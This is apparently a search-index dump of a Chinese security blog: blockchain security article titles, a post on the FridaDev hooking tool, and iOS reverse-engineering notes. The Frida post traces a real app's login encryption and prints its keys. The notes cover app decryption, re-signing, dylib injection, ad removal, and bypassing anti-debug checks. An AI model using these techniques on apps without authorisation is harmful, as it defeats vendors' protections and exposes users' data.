Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-03-25 3月25日安全热点 - Facebook从用户的智能手机收集电话和短信数据 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:155","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-03-21 如何使用Go语言编写自己的区块链挖矿算法 揭秘以太坊中潜伏多年的“偷渡”漏洞，全球黑客正在疯狂偷币 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:156","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-03-16 为什么区块链最终可能会以侵蚀你的网络隐私而告终？ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:157","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-03-12 区块链安全 - DAO攻击事件解析 区块链安全 - 以太坊短地址攻击 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:158","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-02-05 区块链安全技术：企业应用区块链技术时如何考量？ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:159","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-01-25 区块链跨域安全解决方案 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:160","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-01-24 360CERT——区块链技术安全讨论 区块链技术安全讨论 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:161","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2017-06-12 区块链技术的安全价值与局限性解析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:162","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2016-10-12 浅析互联网后最具颠覆性创新技术——区块链安全 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:163","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2016-06-09 微软欲打造基于“区块链”技术的身份识别系统 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:164","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["iOS"],"content":"FridaDev 作为大自然的搬运工和组装师傅，收集并增强一些非常有用的frida脚本封装为FridaDev工具，可以实现一键式逆向需求，提高生产力。 脚本来源： https://github.com/0xdea/frida-scripts https://github.com/AloneMonkey/iOSREBook/tree/master/chapter-7/7.3%20Frida%E5%AE%9E%E6%88%98%E5%BA%94%E7%94%A8/Frida 修改： 动态hook ui增加打印controller和action 根据稳定性trace选择spwan，其他功能选择attach 仓库直通车：https://github.com/houugen/FridaDev ","date":"2018-11-30","objectID":"/posts/ios-hook-fridadev.html:1:0","tags":["iOS","Frida"],"title":"iOS Hook FridaDev","uri":"/posts/ios-hook-fridadev.html"},{"categories":["iOS"],"content":"功能 usage: fridaDev.py [-h] [-l] [-i] [-u appName] [-d appName] [-t identifier] [-e identifier] frida tools optional arguments: -h, --help show this help message and exit -l, --list list running processes -i, --info list installed app infomation -u appName, --ui appName show UI (only for ios) -d appName, --dynhook appName dynamic hook -t identifier, --trace identifier ObjC/java and Module tracer -e identifier, --enumerate identifier Collection of functions to enumerate classes and list 功能：列出运行进程名及pid 使用（支持grep）： ./fridaDev.py -l (| grep xxx)` [*] Device info: Device(id=\"83ae210b1d153c611e268b45b54e5f77d575212b\", name=\"iPhone\", type='usb') pid name 0 launchd 1 launchd 179 amfid 346 jailbreakd 491 wifid ... info 功能：列出已装应用的应用名、bundleId及沙盒路径 使用（支持grep）： ./fridaDev.py -i (| grep xxx) [*] Device info: Device(id=\"83ae210b1d153c611e268b45b54e5f77d575212b\", name=\"iPhone\", type='usb') app name bundle identify documents path undefinedQQ浏览器 com.tencent.mttlite file:///private/var/mobile/Containers/Data/Application/0F2137C5-52EC-4C44-9247-9D1E2666AE0C/Documents 计算器 com.apple.calculator file:///private/var/mobile/Containers/Data/Application/4A593BCE-1460-4785-BC18-18DFAF5BFFBA/Documents 通讯录 com.apple.MobileAddressBook file:///private/var/mobile/Containers/Data/Application/F8C2EB38-1FBE-415B-B562-C910589F66FE/Documents 咪咕善跑 org.imohoo.shanpao file:///private/var/mobile/Containers/Data/Application/0FC0A9BF-958C-4BCD-9AF0-5680B414A853/Documents ui（仅支持iOS） 功能：dump iOS界面布局，支持打印nextResponder、controller及action 使用： 打开需要dump的应用界面 ./fridaDev.py -u appName 打印响应链nextResponder： n 0x144f6e6c0 打印controller： c 0x144f6e6c0 打印action： a 0x144f6e6c0 [*] Device info: Device(id=\"83ae210b1d153c611e268b45b54e5f77d575212b\", name=\"iPhone\", type='usb') \u003cUIWindow: 0x146007e40; frame = (0 0; 320 480); gestureRecognizers = \u003cNSArray: 0x146009290\u003e; layer = \u003cUIWindowLayer: 0x146007dc0\u003e\u003e | \u003cUILayoutContainerView: 0x144d629d0; frame = (0 0; 320 480); autoresize = W+H; gestureRecognizers = \u003cNSArray: 0x14602c450\u003e; layer = \u003cCALayer: 0x144d63ac0\u003e\u003e | | \u003cUINavigationTransitionView: 0x146026be0; frame = (0 0; 320 480); clipsToBounds = YES; autoresize = W+H; layer = \u003cCALayer: 0x146023cf0\u003e\u003e | | | \u003cUIViewControllerWrapperView: 0x144f6fd50; frame = (0 0; 320 480); autoresize = W+H; layer = \u003cCALayer: 0x144f6f2e0\u003e\u003e ... | | | | | | | \u003cFireflyButton: 0x144f6e6c0; baseClass = UIButton; frame = (38 120.5; 183 34); clipsToBounds = YES; opaque = NO; layer = \u003cCALayer: 0x144f6d690\u003e\u003e | | | | | | | | \u003cUIButtonLabel: 0x1460665c0; frame = (73.5 6.5; 36 21.5); text = '登录'; opaque = NO; userInteractionEnabled = NO; layer = \u003c_UILabelLayer: 0x1460667e0\u003e\u003e | | | | | | | | | \u003c_UILabelContentLayer: 0x144f67e20\u003e (layer) | | \u003cUINavigationBar: 0x144da8880; frame = (0 20; 320 44); opaque = NO; autoresize = W; tintColor = UIDeviceWhiteColorSpace 1 1; gestureRecognizers = \u003cNSArray: 0x14602ddd0\u003e; layer = \u003cCALayer: 0x1460279d0\u003e\u003e | | | \u003c_UINavigationBarBackground: 0x146026f60; frame = (0 -20; 320 64); opaque = NO; autoresize = W; userInteractionEnabled = NO; layer = \u003cCALayer: 0x14602b8b0\u003e\u003e | | | | \u003cUIImageView: 0x144db8f10; frame = (0 64; 320 0); opaque = NO; userInteractionEnabled = NO; layer = \u003cCALayer: 0x146023e00\u003e\u003e | | | \u003c_UINavigationBarBackIndicatorView: 0x14602cab0; frame = (8 11.5; 13 21); alpha = 0; opaque = NO; userInteractionEnabled = NO; layer = \u003cCALayer: 0x144da7510\u003e\u003e \u003cCSNavJViewController 0x1450fe000\u003e, state: appeared, view: \u003cUILayoutContainerView 0x144d629d0\u003e | \u003cFireflyTestLoginViewController 0x144f37c30\u003e, state: appeared, view: \u003cUIView 0x14602d3a0\u003e a 0x144f6e6c0 -\u003e loginButtonClick c 0x144f6e6c0 -\u003e \u003cFireflyTestLoginViewController: 0x144f37c30\u003e n 0x144f6e6c0 -\u003e\u003cUIImageView: 0x144f33530; frame = (30.5 145.5; 259 189); alpha = 0.8; opaque = NO; layer = \u003cCALayer: 0x144f03d00\u003e\u003e --\u003e\u003cUIImageView: 0x144f390a0; frame = (0 0; 320 480); opaque = NO; layer = \u003cCALayer: 0x144f24d10\u003e\u003e ---\u003e\u003cUIView: 0x14602d3a0; frame = (0 0; 320 480); autoresize = W+H; layer = \u003cCALayer: 0x144d49060\u003e\u003e ----\u003e\u003cFireflyTestLoginViewControl","date":"2018-11-30","objectID":"/posts/ios-hook-fridadev.html:1:1","tags":["iOS","Frida"],"title":"iOS Hook FridaDev","uri":"/posts/ios-hook-fridadev.html"},{"categories":["iOS"],"content":"实例 以某app为例介绍工具使用。 登录界面 登录数据包加密 现在需要破解加解密，分两种方式： 猜解加解密关键字定位加解密函数 正向分析登录功能找到加解密逻辑 猜解 猜解的方式存在偶然性，不采用标准库加密或常规加解密命名的就很难找到。 我们尝试使用fridaDev的--enumerate功能枚举加解密逻辑，修改ios_enum.js中的正则匹配枚举方法处代码，正则中修改为encrypt|decrypt. var d = findMethods(/encrypt|decrypt/i); for (k in d) { console.log(k); d[k].forEach(function(s) { console.log(\"\\t\" + s); }); } 运行脚本查看输出 [*] Device info: Device(id=\"83ae210b1d153c611e268b45b54e5f77d575212b\", name=\"iPhone\", type='usb') CMBCStandardiOSSipKeyboardVC - setNeedEncrypt: - getEncryptedDataWithError: - needEncrypt - initWithKeyboardType:needEncrypt: FireflySecurityUtil + qhd_FireflyRSAEncrypt:cerPath: + qhd_FireflyRSAEncrypt:publicKey: + qhd_aesDecrypt🔑vector: + qhd_aesEncrypt🔑vector: + aesEncrypt🔑vector: + aesDecrypt🔑vector: + FireflyRSAEncrypt:publicKey: + FireflyRSAEncrypt:cerPath: CMCCSafeManager - getEncryptCode: - decryptCode: - getDecryptCode: - encryptCode: - encryptWithContent: - decryptWithContent: ... 通过挨个排查或者你dump了界面UI知道view的controller类名，其实已经基本能猜测调用哪些相关加解密函数。 如果你还是不确定哪个类里的那个方法被调用，没关系，我们通过trace功能追踪函数调用来确定具体使用哪个方法。 修改ios_trace.js尾部代码： if (ObjC.available) { trace(\"*[CMBCStandardiOSSipKeyboardVC *]\"); trace(\"*[FireflySecurityUtil *]\"); trace(\"*[CMCCSafeManager *]\"); } else { send(\"error: Objective-C Runtime is not available!\"); } 运行代码后启动应用，点击登录查看此处log： ... *** entered +[FireflySecurityUtil FireflyRSAEncrypt:publicKey:] Caller: 0x1840de580 CoreFoundation!__invoking___ FireflyRSAEncrypt: {\"flag\":\"0\",\"ckey\":\"AZWKLXOMREDGAKPMTIBHTKOBRVGKNBHC\"} publicKey: MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDFV+0lKbisYcFxEaalfN4DMc14fMVTZTFZB1X4MoZtEu6lFpVvmSZT4eaSgp1Vxol8HSsqFncxxtv/GXpqJ3kY1DghafKliSFfTkV1PYoHKGoUYVdwt/HubzQBcC3xh+xiZvspBWy4Bjal//HoHrBBN05R2ZFnU9obS4Xw+jKbOQIDAQAB *** entered +[FireflySecurityUtil stripPublicKeyHeader:] Caller: 0x1840de580 CoreFoundation!__invoking___ stripPublicKeyHeader: \u003c30819f30 0d06092a 864886f7 0d010101 05000381 8d003081 89028181 00c557ed 2529b8ac 61c17111 a6a57cde 0331cd78 7cc55365 31590755 f832866d 12eea516 956f9926 53e1e692 829d55c6 897c1d2b 2a167731 c6dbff19 7a6a2779 18d43821 69f2a589 215f4e45 753d8a07 286a1461 5770b7f1 ee6f3401 702df187 ec6266fb 29056cb8 0636a5ff f1e81eb0 41374e51 d9916753 da1b4b85 f0fa329b 39020301 0001\u003e retval: \u003c30818902 818100c5 57ed2529 b8ac61c1 7111a6a5 7cde0331 cd787cc5 53653159 0755f832 866d12ee a516956f 992653e1 e692829d 55c6897c 1d2b2a16 7731c6db ff197a6a 277918d4 382169f2 a589215f 4e45753d 8a07286a 14615770 b7f1ee6f 3401702d f187ec62 66fb2905 6cb80636 a5fff1e8 1eb04137 4e51d991 6753da1b 4b85f0fa 329b3902 03010001\u003e *** exiting +[FireflySecurityUtil stripPublicKeyHeader:] retval: NrbG9/JxK65OMfl9WsFmCYU5Xfr1Av6Q/XOulxeoDc5CSf2AajFgE3CSH6MVHD3YlqCq4/Z20PevpakS1LMjsIpiywsOsrrfDESr87ATJ3Ta4TuGfg7ooLwAbUVHh77a4ZJInEaz63cpZuviy5b/fsftGjqllWtqxATNjU3dRBI= *** exiting +[FireflySecurityUtil FireflyRSAEncrypt:publicKey:] *** entered +[FireflySecurityUtil isJailBreak] Caller: 0x1840de580 CoreFoundation!__invoking___ retval: 0x1 *** exiting +[FireflySecurityUtil isJailBreak] ... *** entered -[FireflySecurityUtil aesToken] Caller: 0x1840de580 CoreFoundation!__invoking___ retval: AZWKLXOMREDGAKPM5pblzNXaVqAXmBwl *** exiting -[FireflySecurityUtil aesToken] *** entered +[FireflySecurityUtil aesEncrypt🔑vector:] Caller: 0x1840de580 CoreFoundation!__invoking___ aesEncrypt: {\"secRan\":\"W9zvEM\",\"staffId\":\"F\",\"password\":\"NmQk8hKN9Sn1UTQha4JnAxYnfJiUGdwTw+Lws9rWHhsXgBt2ZARjOfrxH3Ka166Wias83OROXYjof6NvZ9zMJaKAP1NBPsiWZEE7gkRDlpCKwR\\/AVMwOzA4xAFcb7WKWIWrJg7NjpsvMvsjxzqxx\\/2sR4zglTx8P6jpHWigCEf0=\",\"imeiCode\":\"3823ACEE-A647-46F8-8D14-8065E5C2B0C6\",\"validateImgCode\":\"\"} key: AZWKLXOMREDGAKPM5pblzNXaVqAXmBwl vector: 1234567812345678 retval: yUF8H3QiqR21mTIrNxTTRtNx4l2IAyJ6AT0r7ATs9vO5MgYCahUT3qRxrT+qWDhyDD2znN5t1esauWYHPt+2AAd4NrfcYVs/QPMOstjpGcp4wey1HssAYNk2OtAKz5lRo6Bnw8CFiKMWdpdBS5Y4/G80irK0Dq12oPc52I956UtP3zCFNqE2rfQFZqcd35FA0CajccT5Ny6v/qKoScApnTLBmTKMmj3na+PTzyIOLXr1ObjwY9C+Snygf4xzb9AEU73WbIjxhsfdG6m3mEGrugw8Gn3nj/Eqb3mREUkvsQMt9FezDd4PWnJTRM6r6D5S5WI7ACYJU8kYDF0VK4H0Ixpe+xNoLdtYa","date":"2018-11-30","objectID":"/posts/ios-hook-fridadev.html:1:2","tags":["iOS","Frida"],"title":"iOS Hook FridaDev","uri":"/posts/ios-hook-fridadev.html"},{"categories":["iOS"],"content":"iOS系统安全架构 安全启动链 信任链：系统启动 -\u003e boot rom -\u003e LLB -\u003e iBoot -\u003e kernal 系统软件授权 固件 -\u003e cpu -\u003e itunes ==\u003e 服务器验证 低版本服务器返回验证许可，可通过保存shsh绕过验证 高版本返回验证许可+随机串 应用代码签名 所有可执行代码（动态库，动态资源）运行时验证签名 运行时进程安全 沙盒：/var/mobile/Containers/Data/Application/[GUID] DEP ASLR 数据加密保护 硬件秘钥 + 密码秘钥 -\u003e 类秘钥 硬件秘钥 -\u003e 文件系统秘钥 类秘钥 + 文件系统秘钥 -\u003e 文件秘钥 =\u003e 文件内容 ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:1:0","tags":["iOS"],"title":"iOS逆向笔记","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"越狱 Cydia Substrate MobileHooker MobileLoader safe mode ssh连接ios设备 openssh ssh root@ip 通过usb连接： usbmuxd -\u003e tcpreplay.py -t 22:xx brew install libimobiledevice -\u003e iproxy 2222 22 ssh root@localhost -p xx 配置免密码登录越狱设备 ssh-keygen -t rsa -P '' ssh-copy-id -i /Users/username/.ssh/id_rsa root@ip 或者安装sshpass自己设置密码: brew install https://raw.githubusercontent.com/kadwanev/bigboybrew/master/Library/Formula/sshpass.rb Tip ssh key不匹配，删除.ssh/know_hosts对应可以即可 终端输入中文 cd /var/root touch .inputrc echo 'set convert-meta off' \u003e\u003e .inputrc echo 'set meta-flag on' \u003e\u003e .inputrc echo 'set output-meta on' \u003e\u003e .inputrc echo 'set input-meta on' \u003e\u003e .inputrc 插件 ps：安装adv-cmds 绕过app签名：安装appsync 文件显示：安装apple file conduit 2 fileza 越狱工具 next.tweakboxapp.com ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:2:0","tags":["iOS"],"title":"iOS逆向笔记","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"app文件结构和构建 查看符号表：nm -nm 依赖库、汇编等：otool -L / -tV 从源代码到ipa的构建过程 ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:3:0","tags":["iOS"],"title":"iOS逆向笔记","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"数据存储 property list plutil -convert xml1 xx -o xx.plist User Defaults sandbox -\u003e Library -\u003e Preferences -\u003e xx.plist Archive Database sqlite keyChain Keychain Dumper ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:4:0","tags":["iOS"],"title":"iOS逆向笔记","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"Runtime ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:5:0","tags":["iOS"],"title":"iOS逆向笔记","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"Hook Method Swizzle 针对objective-C，利用runtime，替换Dispatch table中SEL和IMP的对应关系。 IOS黑魔法－Method Swizzling Objective-C Method Swizzling 的最佳实践 如何在 Swift 中高效地使用 Method Swizzling fishhook rebind_symbols：遍历查找懒加载表和非懒加载表的符号并替换地址。 https://github.com/facebook/fishhook Cydia Substrate MSHookMessageEx -\u003e objC replace Objective-C message implementations MSHookFunction -\u003e c hijack native code to your own implementation http://iphonedevwiki.net/index.php/Cydia_Substrate ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:6:0","tags":["iOS"],"title":"iOS逆向笔记","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"ARM汇编 push {r0} \u003c==\u003e str r0,[sp,#-4]! pop {r0} \u003c==\u003e ldr r0,[sp],#4 汇编使用intel模式：https://github.com/vadimcn/vscode-lldb/issues/87 模拟器使用x86架构，32位入栈。64位rdi、rsi、rdx、rcx、r8、r9，多余参数入栈。 真机arm架构，32位r0-3，64位w0-8。 ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:7:0","tags":["iOS"],"title":"iOS逆向笔记","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"Mach-O 文件架构 lipo -info whatsApp file whatsApp Header otool -hv whatsApp MachOView 魔数 通用格式：0xcafebabe armv7：0xfeedface arm64：0xfeedfacf 文件类型 OBJECT：1 EXECUTE：2 DYLIB：6 Load commands -\u003e n * Segment otool -lv whatsApp (lldb) image list -e -f Load commands -\u003e LC_SEGMENT(_TEXT) -\u003e VM address 加载地址 + 段虚拟地址 = 文件加载地址 Data -\u003e n * Section Mach-O动态链接（延迟加载） Code Signature codesign -dvvvv whatsApp ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:8:0","tags":["iOS"],"title":"iOS逆向笔记","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"App签名 查看加密标识： otool -l whatsApp | grep crypt 查看电脑中证书 security find-identity -v -p codesigning 获取描述文件（embedded.mobileprovision） 苹果官网获取 新建工程真机安装后在包中获取 查看：security cms -D -i embedded.mobileprovision 拷贝至要签名文件中 生成授权文件 security cms -D -i embedded.mobileprovision \u003e entitlements_full.plist /usr/libexec/PlistBuddy -x -c ‘Print:Entitlements’ entitlements_full.plist \u003e entitlements.plist 重签名 codesign -fs “iPhone Developer: xxx（2中证书名）” –no-strict –entitlements=xxx（4中授权文件） Payload/xxx.app 如果有extension，可删可重签名 如果新加动态库，需要签名 压缩为ipa zip -qr target.ipa Payload ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:9:0","tags":["iOS"],"title":"iOS逆向笔记","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"动态库 clang编译objec并签名，放入Library-\u003eload dylibrary-\u003eDynamicLibaries中 导出和隐藏符号 static export_list -fvisibility=hidden 函数调用顺序 __attribute__((constructor)) main __attribute__((destructor)) 基于c++动态库 基于oc动态库 注入可执行文件 LC_LOAD_DYLIB 工具: insert_dylib 查看：otool -L ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:10:0","tags":["iOS"],"title":"iOS逆向笔记","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"应用砸壳 查看加壳 otool -l xx(mach-o) | grep cryptid 从itools导出ipa 利用scp导出执行文件（打开app，ps找到进程） 砸壳工具 dumpdecrypted 查找Document路径: cycript -p WeChat NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES)[0] AloneMonkey/dumpdecrypted Clutch frida-ios-dump ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:11:0","tags":["iOS"],"title":"iOS逆向笔记","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"class-dump https://github.com/nygard/class-dump 官方工具修正后编译： // CDObjectiveC2Processor.m 224h objc2Class.data = value \u0026 ~3; //error: value \u0026 ~7; ./class-dump mach-o_file -H -o ./Headers Tip 通过 lipo mach-o_file -thin armv7 -output mach-o_file.armv7 瘦身提取砸壳架构 ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:12:0","tags":["iOS"],"title":"iOS逆向笔记","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"Reveal cydia中添加BigBoss源安装Reveal2Loader，开启reveal使用 高版本reveal需要将RevealServer（help-\u003eshow reveal library in finder-\u003eios library）重命名为libReveal.dylib，并和libReveal.plist一同放入ios的Library-\u003eMobileSubstrate-\u003eDynamicLibraries中 plist文件内容： { Filter = { Bundles = ( \"bundleID\" ); }; } MonkeyDev ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:13:0","tags":["iOS"],"title":"iOS逆向笔记","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"cycript cycript ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:14:0","tags":["iOS"],"title":"iOS逆向笔记","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"静态分析 工具 hopper IDA arm汇编，结构体！ ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:15:0","tags":["iOS"],"title":"iOS逆向笔记","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"动态调试 处理debugserver 下载/Developer/usr/bin/debugserver 授权文件entitlements.plist内容： com.apple.springboard.debugapplications run-unsigned-code get-task-allow task_for_pid-allow 签名 上传至/usr/bin/debugserver lldb + debugserver 连接 映射端口： python tcpreply.py -t 22:2222 1234:1234 手机：debugserver *:1234 -a WhatsApp pc： llvm –\u003e process connect connect://localhost:1234 调试指令 image list -o -f b -[xx xxx] br s -a 0xaaaaaa po $r0 p/x $r0 x/s $r1 register read memory read br list / br com add 1.1 : DONE xcode调试 新建与app同名工程 运行脚本 run 安装chisel or 使用 MokeyDev Tip 定位button的action事件 传统: [btn allTargets] //xxx [btn allControlEvents] //yyy [btn actionsForTarget:xxx forControlEvent:yyy] 使用chisel: pviews pactions btn ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:16:0","tags":["iOS"],"title":"iOS逆向笔记","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"Theos tweak 执行$THEOS/bin/nic.pl创建工程 编写hook代码 ``` %hook ViewController -(void)clickme:(id)sender{ NSLog(@\"Click me hooked !!!\"); %log; %orig; //执行原方法 } %end ``` 编译 * make * make package * make install iOSOpenDev（13年没更新了） MonkeyDev 查看Log输出 安装libimobiledevice工具(需要usbmuxd): brew install --HEAD libimobiledevice 使用如下命令查看输出Log: idevicesyslog | grep 'xxx' 或者使用自带的 console.app 程序查看。 ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:17:0","tags":["iOS"],"title":"iOS逆向笔记","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"Oplayer lite 去广告 使用frida-ios-dump砸壳 用class-dump导出头文件 用reveal定位广告view 用xcode lldb调试找到广告的addSubview:调用位置 使用hooper静态分析逻辑 用Theos写插件改变逻辑去广告 ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:18:0","tags":["iOS"],"title":"iOS逆向笔记","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"SnapChat 消息 Tip 使用cycript或者reveal找到view对应的viewcontroller 通过theos的logify.pl hook一个类所有方法找到具体调用 通过lldb打印具体调用的执行堆栈 – bt tweak找不到类可以通过声明@class xxx解决 ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:19:0","tags":["iOS"],"title":"iOS逆向笔记","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"迁移到非越狱设备 ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:20:0","tags":["iOS"],"title":"iOS逆向笔记","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"Frida ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:21:0","tags":["iOS"],"title":"iOS逆向笔记","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"数据加密 字符串加密 数据存储加密 网络数据加密 ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:22:0","tags":["iOS"],"title":"iOS逆向笔记","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"反调试与反注入 反调试 ptrace ptrace(PT_DENY_ATTACH, 0, 0, 0); void *handle = dlopen(0, RTLD_GLOBAL | RTLD_NOW); ptrace_ptr_t ptrace_ptr = (ptrace_ptr_t)dlsym(handle, \"ptrace\"); ptrace_ptr(PT_DENY_ATTACH, 0, 0, 0); sysctl 使用sysctl获取当前进程，标志位p_flag对比P_TRACED BOOL isDebuggerPresent(){ int name[4]; struct kinfo_proc info; size_t info_size = sizeof(info); info.kp_proc.p_flag = 0; name[0] = CTL_KERN; name[1] = KERN_PROC; name[2] = KERN_PROC_PID; name[3] = getpid(); if(sysctl(name, 4, \u0026info, \u0026info_size, NULL, 0) == -1){ NSLog(@\"sysctl error...\"); return NO; } return ((info.kp_proc.p_flag \u0026 P_TRACED) != 0); } syscall syscall(26, 31 , 0, 0, 0); 反反调试 通过fish hook hook ptrace hook dlsym hook syscall hook sysctl 反注入 编译加入标志位 -Wl,-sectcreate,__RESTRICT,__restrict,/dev/null 原理，增加__RESTRICT这个section dylib的注入一般是通过DYLD_INSERT_LIBRARIES这个环境变量来实现的，在dyld源码中： case restrictedBySegment: dyld::log(\"main executable (%s) has __RESTRICT/__restrict section\\n\", sExecPath); break; 故存在该分段即可忽略DYLD_开头的环境变量，从而防止dylib注入。 检测加载动态库路径中是否有DynamicLibraries（测试没用） BOOL isInjected0(){ int count = _dyld_image_count(); if(count \u003e 0){ for(int i=0; i\u003ccount; i++){ const char* dyld = _dyld_get_image_name(i); if(strstr(dyld, \"DynamicLibraries\")){ return YES; } } return NO; } return NO; } 检测是否存在环境变量DYLD_INSERT_LIBRARIES（测试有用） BOOL isInjected1(){ char* env = getenv(\"DYLD_INSERT_LIBRARIES\"); if(env) return YES; return NO; } 反反注入 修改mach-o文件中__RESTRICT字段中restrict字符串为其他字符串 ","date":"2018-10-12","objectID":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html:23:0","tags":["iOS"],"title":"iOS逆向笔记","uri":"/posts/ios%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0.html"},{"categories":["iOS"],"content":"混淆 类名和方法名混淆 宏定义替换 ios-class-guard 直接替换MachO文件 修改 __objc_classname 修改 __objc_methname OLLVM ​ 